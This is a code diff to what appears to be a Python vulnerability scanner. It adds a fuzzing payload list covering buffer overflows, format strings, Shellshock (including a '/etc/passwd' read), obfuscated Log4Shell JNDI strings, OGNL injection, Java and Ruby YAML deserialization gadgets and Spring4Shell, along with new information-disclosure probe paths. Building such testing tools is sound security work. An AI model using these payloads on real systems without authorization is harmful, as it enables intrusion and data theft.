@@ -1001,6 +1001,49 @@ class SystematicFuzzer:
             "' OR IF(1=2,1,0)--",
             "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--",
         ],
+        "memcorrupt-payloads": [
+            # Buffer overflow patterns
+            "A" * 256,
+            "A" * 1024,
+            "A" * 4096,
+            "A" * 8192,
+            "A" * 65536,
+            "\x00" * 256,
+            # Format string patterns
+            "%x" * 20,
+            "%s" * 20,
+            "%n",
+            "%p" * 20,
+            "AAAA" + "%08x." * 8,
+            "%d" * 50,
+            "%x%x%x%x%x%x%x%x%x%x%n",
+            # Integer overflow values
+            "2147483647",     # INT_MAX
+            "2147483648",     # INT_MAX + 1
+            "4294967295",     # UINT_MAX
+            "4294967296",     # UINT_MAX + 1
+            "-1",
+            "-2147483648",    # INT_MIN
+            "0",
+            "99999999999999999999",
+            "18446744073709551615",  # UINT64_MAX
+            # Shellshock
+            '() { :;}; echo vulnerable',
+            '() { _; } >_[$($())]',
+            '() { :;}; /bin/cat /etc/passwd',
+            # Log4Shell
+            '${jndi:ldap://127.0.0.1/test}',
+            '${${lower:j}ndi:${lower:l}dap://127.0.0.1/test}',
+            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/test}',
+            # OGNL injection
+            '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("id")}',
+            # YAML deserialization (Java)
+            '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/"]]]]',
+            # Spring4Shell
+            'class.module.classLoader.resources.context.parent.pipeline.first.pattern=test',
+            # Ruby YAML
+            "--- !ruby/object:Gem::Installer\ni: x",
+        ],
     }
 
     def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 120,
@@ -2112,6 +2155,10 @@ class InfoDisclosureScanner:
         # Init / setup
         ("/install.php", "setup", r"install|setup|configuration"),
         ("/setup.php", "setup", r"install|setup|configuration"),
+        # Nginx / Go / OIDC
+        ("/nginx_status", "server_info", r"Active connections:\s*\d+|server accepts handled requests"),
+        ("/debug/vars", "debug", r'"cmdline"|"memstats"|"goroutine"'),
+        ("/.well-known/openid-configuration", "config", r'"issuer"|"authorization_endpoint"|"token_endpoint"'),
     ]
 
     # Tech stack → category filter (only test relevant paths)
@@ -2136,6 +2183,7 @@ class InfoDisclosureScanner:
     _UNIVERSAL_CATEGORIES = {
         "git", "env", "docker", "api_docs", "backup", "creds",
         "robots", "sitemap", "graphql", "cloud", "config",
+        "server_info", "debug",
     }
 
     def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
